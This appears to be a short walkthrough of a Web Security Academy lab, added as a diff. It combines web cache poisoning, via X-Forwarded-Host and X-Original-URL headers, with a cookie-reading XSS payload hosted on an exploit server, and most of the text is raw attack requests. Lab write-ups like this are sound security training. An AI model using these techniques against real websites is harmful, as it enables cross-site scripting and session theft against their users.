@@ -1,0 +1,59 @@
+Combining web cache poisoning vulnerabilities
+
+As has been the case for this chapter, the solution provided is great. And it's a biggie.
+Here's my exploit server:
+
+File:
+/resources/json/translations.json
+
+Head:
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+Access-Control-Allow-Origin: *
+
+Body:
+{
+  "en": {
+    "name": "English"
+  },
+  "es": {
+    "name": "español",
+    "translations": {
+      "Return to list": "Volver a la lista",
+      "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
+      "Description:": "Descripción"
+    }
+  }
+}
+
+Request 1:
+
+GET /?localized=1 HTTP/1.1
+Host: ac1b1f131e43d21a80d428ad00870084.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac1b1f131e43d21a80d428ad00870084.web-security-academy.net/
+X-Forwarded-Host: accd1fa81ed2d2558022287c01f800f8.web-security-academy.net
+Connection: close
+Cookie: session=a2LnnvlUXHHA3uLtRpBOKUtezsZ1cVTU; lang=es
+Upgrade-Insecure-Requests: 1
+
+
+
+Request 2:
+GET / HTTP/1.1
+Host: ac1b1f131e43d21a80d428ad00870084.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Original-URL: /setlang\es
+Connection: close
+Referer: https://ac1b1f131e43d21a80d428ad00870084.web-security-academy.net/?localized=1
+Cookie: session=a2LnnvlUXHHA3uLtRpBOKUtezsZ1cVTU; lang=en
+Upgrade-Insecure-Requests: 1
+
+
+Once you start getting a 302 response in Burp, just wait for the user to visit and you'll get your lab complete prompt. Well done :)
